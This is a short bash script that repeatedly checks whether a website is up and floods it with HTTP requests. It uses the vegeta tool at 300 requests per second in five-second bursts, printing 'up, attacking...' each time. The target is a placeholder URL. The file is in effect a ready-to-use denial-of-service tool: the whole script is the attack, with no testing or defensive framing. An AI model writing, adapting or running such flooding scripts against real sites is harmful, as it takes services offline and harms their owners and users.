#!/bin/bash

URL="https://www.todo.com"
ATTACK_DELAY_SEC=5


timestamp() {
    date "+%d/%m/%y %H:%M:%S"
}

print_status() {
    status="$1"

    prefix="$(timestamp) - $URL"
    if test "$status" = "up"; then
        echo "$prefix up, attacking..."
    else
        echo "$prefix down, waiting..."
    fi
}


while true; do
    if curl -sfIm "$ATTACK_DELAY_SEC" "$URL" > /dev/null 2>&1; then
        print_status up
        echo "GET $URL" \
            | vegeta attack -duration="$ATTACK_DELAY_SEC"s -rate 300 \
            | tee results.bin \
            | vegeta report
        echo
    else
        print_status down
    fi
    sleep "$ATTACK_DELAY_SEC"
done
